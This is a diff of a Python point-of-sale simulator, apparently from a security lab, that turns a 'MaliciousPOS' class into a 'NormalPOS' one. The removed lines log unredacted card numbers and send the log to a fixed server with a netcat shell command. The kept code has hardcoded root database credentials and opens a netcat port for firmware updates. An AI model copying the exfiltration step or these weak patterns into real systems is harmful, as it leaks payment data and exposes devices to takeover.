@@ -10,15 +10,17 @@ import traceback
 import subprocess
 
 
-class MaliciousPOS:
+class NormalPOS:
+
     def __init__(self):
         # Open database connection
-        self.payment_server_ip = "localhost"  # private ip address of payment server: 10.0.0.20
-        self.payment_server_port = "6666"
+        host = "10.0.0.20"  # private ip address of payment server: 10.0.0.20
         user = "root"
         passwd = "root"
         db_name = "payment_db"
-        self.db = MySQLdb.connect(self.payment_server_ip, user, passwd, db_name)
+        self.db = MySQLdb.connect(host, user, passwd, db_name)
+
+        # prepare a cursor object using cursor() method
         self.cursor = self.db.cursor()
         self.port = "5555"
 
@@ -27,7 +29,7 @@ class MaliciousPOS:
         return '*' * 12 + credit_card_no[12:]
 
     def run(self):
-        print "malicious POS firmware running..."
+        print "normal POS firmware running..."
 
         # keep opening nc listening port to receive firmware update
         with open("pos_firmware.py", "w") as firmware:
@@ -40,7 +42,7 @@ class MaliciousPOS:
             content = ''.join(random.choice(string.ascii_letters) for _ in range(8))
             amount = random.uniform(1, 10000)
             credit_card_no = ''.join(random.choice(string.digits) for _ in range(16))
-            rd_credit_card_no = MaliciousPOS.redact_info(credit_card_no)
+            rd_credit_card_no = NormalPOS.redact_info(credit_card_no)
 
             sql = "INSERT INTO transactions(transac_id, \
                      datetime, content, amount, credit_card_no) \
@@ -59,17 +61,6 @@ class MaliciousPOS:
                 # Rollback in case there is any error
                 self.db.rollback()
 
-            with open("log_file", "w") as log_file:
-                unredacted_info = ("(transac_id, datetime, content, amount, credit_card_no) = "
-                                   "('%s','%s', '%s', '%.2f', '%s')\n" %
-                                   (transac_id, datetime, content, amount, credit_card_no))
-                log_file.write(unredacted_info)
-                log_file.close()
-
-            # transfer the content of local log file to server
-            nc_call = "nc " + self.payment_server_ip + " " + self.payment_server_port + " < " + "log_file"
-            subprocess.Popen(nc_call, shell=True)
-
             # assume interval is drawn from exp distribution
             interval = random.expovariate(0.1)
             # insert one record every interval seconds
@@ -77,7 +68,7 @@ class MaliciousPOS:
 
 
 if __name__ == '__main__':
-    client = MaliciousPOS()
+    client = NormalPOS()
     try:
         client.run()
     finally:
@@ -86,3 +77,4 @@ if __name__ == '__main__':
         client.db.close()
 
     sys.exit()
+
